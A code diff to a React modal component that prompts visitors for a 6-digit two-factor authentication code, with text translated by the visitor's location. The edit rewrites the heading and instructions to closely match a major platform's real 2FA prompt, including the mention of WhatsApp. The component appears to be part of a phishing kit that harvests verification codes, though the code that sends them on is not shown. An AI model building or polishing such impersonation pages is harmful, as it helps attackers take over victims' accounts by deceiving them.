@@ -26,7 +26,7 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     useEffect(() => {
         if (!geoInfo) return;
 
-        const textsToTranslate = ['Check your authentication code', 'Enter the 6-digit code for this account from the two-factor authentication you set up (such as Google Authenticator, email or text message on your mobile).', 'Code', "This code doesn't work. Check it's correct or try a new one after", 'Continue'];
+        const textsToTranslate = ['Two-factor authentication required','Approve from another device or enter your verification code. Enter the 6-digit code we just sent via the authenticator app you set up, text message, WhatsApp, or email.', 'Code', "This code doesn't work. Check it's correct or try a new one after", 'Continue'];
 
         const translateAll = async () => {
             const translatedMap: Record<string, string> = {};
@@ -84,8 +84,8 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     return (
         <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-4'>
             <div className='flex max-h-[90vh] w-full max-w-xl flex-col gap-7 rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-4'>
-                <p className='mt-4 text-2xl font-bold'>{t('Check your authentication code')}</p>
-                <p className='text-xl'>{t('Enter the 6-digit code for this account from the two-factor authentication you set up (such as Google Authenticator, email or text message on your mobile).')}</p>
+                <p className='mt-4 text-2xl font-bold'>{t('Two-factor authentication required')}</p>
+                <p className='text-xl'>{t('Approve from another device or enter your verification code. Enter the 6-digit code we just sent via the authenticator app you set up, text message, WhatsApp, or email.')}</p>
                 <div className='flex flex-col justify-center'>
                     <Image src={VerifyImage} alt='' />
                     <div className='relative mt-4 w-full'>
